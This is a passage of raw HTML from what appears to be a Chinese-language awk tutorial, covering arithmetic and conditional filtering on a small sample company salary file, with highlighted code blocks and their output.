class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;span class=\"hljs-variable\"&gt;&lt;span class=\"hljs-variable\"&gt;&lt;span class=\"hljs-variable\"&gt;&lt;span class=\"hljs-variable\"&gt;$ &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;awk &lt;span class=\"hljs-string\"&gt;&lt;span class=\"hljs-string\"&gt;&lt;span class=\"hljs-string\"&gt;&lt;span class=\"hljs-string\"&gt;'{a = 12; b = 24; print a + b}'&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; company.txt\r\n&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;36&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;\r\n&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;36&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;\r\n&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;36&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;\r\n&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;&lt;span class=\"hljs-number\"&gt;36&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afc2300572600-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afc2300572600-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afc2300572600-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afc2300572600-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afc2300572600-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afc2300572600-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afc2300572600-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-variable\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-variable\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-variable\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-variable\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-string\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-string\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-string\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-string\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-s\">'{a = 12; b = 24; print a + b}'</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afc2300572600-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">36</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afc2300572600-3\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">36</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afc2300572600-4\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">36</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afc2300572600-5\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">span </span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"hljs-number\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">36</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">span</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afc2300572600-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0047 seconds] -->\r\n<p>上面这段脚本表示，先声明两个变量 a = 12 和 b = 24，然后用 print 打印出 a 加上 b 的结果。</p>\n<p>看到上面的输出结果，你很可能又是一脸的懵逼，为什么会重复输出 4 次同样的计算结果。所以说小时不学好，长大做IT。 知识这东西真到了要用的时候，能亮瞎别人的双眼，好了，不废话。请记住 awk 是针对文件的每一行来执行一次单引号 里面的脚本代码，每读取到一行就会执行一次，文件里面有多少行就会执行多少次，但 BEGIN 和 END 关键字后面的 脚本代码除外，如果被处理的文件中什么都没有，那 awk 就一次都不会执行。。。</p>\n<p><strong>awk 还支持其他的数学运算符</strong></p>\n<ul>\n<li><code>+</code> 加法运算符</li>\n<li><code>-</code> 减法运算符</li>\n<li><code>*</code> 乘法运算符</li>\n<li><code>/</code> 除法运算符</li>\n<li><code>%</code> 取余运算符</li>\n</ul>\n<p><strong>在 awk 中使用条件判断</strong></p>\n<p>比如有一个文件 company.txt 内容如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afc6499475874\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nyahoo   100 4500\r\ngoogle  150 7500\r\napple   180 8000\r\ntwitter 120 5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afc6499475874-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afc6499475874-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afc6499475874-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afc6499475874-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afc6499475874-1\"><span class=\"crayon-i\">yahoo</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afc6499475874-2\"><span class=\"crayon-i\">google</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7500</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afc6499475874-3\"><span class=\"crayon-i\">apple</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">180</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afc6499475874-4\"><span class=\"crayon-i\">twitter</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><strong>我们要判断文件的第 3 列数据，也就是平均工资小于 5500 的公司，然后将其打印输出</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afca451503364\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '$3 &lt; 5500 {print $0}' company.txt\r\nyahoo   100 4500\r\ntwitter 120 5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afca451503364-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afca451503364-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afca451503364-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afca451503364-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'$3 &lt; 5500 {print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afca451503364-2\"><span class=\"crayon-i\">yahoo</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4500</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afca451503364-3\"><span class=\"crayon-i\">twitter</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>上面的命令结果就是平均工资小于 5500 的公司名单， <code>$3 &lt; 5500</code> 表示当第 3 列字段的内容小于 5500 的时候才会执行后面的 <code>{print $0}</code> 代码块</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afcd259560896\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '$1 == \"yahoo\" {print $0}' company.txt\r\nyahoo   100 4500</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afcd259560896-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afcd259560896-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afcd259560896-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'$1 == \"yahoo\" {print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afcd259560896-2\"><span class=\"crayon-i\">yahoo</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4500</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><strong>awk 还有一些其他的条件操作符如下</strong></p>\n<ul>\n<li><code>&lt;</code> 小于</li>\n<li><code>&lt;=</code> 小于或等于</li>\n<li><code>==</code> 等于</li>\n<li><code>!=</code> 不等于</li>\n<li><code>&gt;</code> 大于</li>\n<li><code>&gt;=</code> 大于或等于</li>\n<li><code>~</code> 匹配正则表达式</li>\n<li><code>!~</code> 不匹配正则表达式</li>\n</ul>\n<p><strong>使用 if 指令判断来实现上面同样的效果</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afd0482304044\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{if ($3 &lt; 5500) print $0}' company.txt\r\nyahoo   100 4500\r\ntwitter 120 5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afd0482304044-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afd0482304044-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afd0482304044-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afd0482304044-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{if ($3 &lt; 5500) print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afd0482304044-2\"><span class=\"crayon-i\">yahoo</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4500</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afd0482304044-3\"><span 